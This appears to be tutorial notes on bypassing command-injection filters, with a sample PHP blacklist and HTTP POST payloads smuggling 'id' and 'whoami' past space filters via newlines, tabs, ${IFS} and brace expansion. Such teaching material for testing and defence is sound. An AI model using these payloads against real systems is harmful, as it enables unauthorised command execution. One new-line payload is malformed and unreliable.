## Filter/WAF Detection
If we try the following payload (`?ip=127.0.0.1;id&&whoami`) and received any error message. It may indicate that we triggered a security mechanism, this might be because the web application has either detected a blacklisted character or a blacklisted command.

If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF.
## Blacklisted Character and Commands
A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. A PHP code may look something like the following:
```php
$blacklist = ['&', '|', ';', 'whoami', 'id', ...SNIP...];
foreach ($blacklist as $malicious) {
	if (strpos($_POST['ip'], $malicious) !== false) {
		echo "Invalid input.";
	}
}
```
If any character or command in the string an attacker sent matches a value of the blacklist array, the request will be denied. However, in this example, the code is looking for an exact match of the provided character or command. An attacker can easily bypass this by using a different command or obfuscating their payload.
## Identifying Blacklisted Characters and Commands
To identify which characters and commands are blacklisted, send a request containing each character or command and see which of them gets an error. An error indicates that the character or command is blacklisted.
## Bypass Space Filters
A commonly blacklisted character is a space ( ) or `+` when its encoded. There are a couple of ways to bypass such filters for this characters.
## Using New-line
Using 
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1%0d%0id 
```
### Using Tabs
Using tabs (`%09`) instead of spaces is a technique that might work, since both Linux and Windows accept commands with tabs in between arguments, and they are executed the same.  Example:
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1%09whoami
```
### Using $IFS
The `$IFS` is a Linux Environment Variable that can used since its default value is a space and a tab, which would work between command arguments. So if the `$IFS` is used, the variable should automatically be replaced by a space and the command should work.
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1${IFS}whoami
```
> Note: When parsed, this will translate into the CLI `127.0.0.1$IFSwhoami`.
## Using Brace Expansion
The Bash Brace Expansion feature (`{ls,-la}`) automatically ads spaces between arguments wrapped in braces. We can also utilize this same method to bypass space filters.
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1%0d%0a{id,whoami}
```